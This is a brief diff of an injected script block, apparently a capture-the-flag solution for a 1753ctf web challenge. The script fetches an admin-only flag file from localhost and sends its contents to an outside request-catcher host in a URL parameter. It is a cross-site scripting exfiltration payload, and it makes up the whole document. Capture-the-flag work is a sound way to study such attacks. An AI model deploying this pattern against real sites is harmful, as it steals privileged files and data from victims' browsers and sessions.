@@ -1,5 +1,5 @@
 <script>
-fetch("https://do-not-cheat-bb7d7982d597.1753ctf.com/app/admin/flag.pdf")
+fetch("http://localhost:1337/app/admin/flag.pdf")
   .then(r => r.text())
   .then(flag => {
     fetch("https://bcbbeeo.request.dreamhack.games/?flag=" + encodeURIComponent(flag));
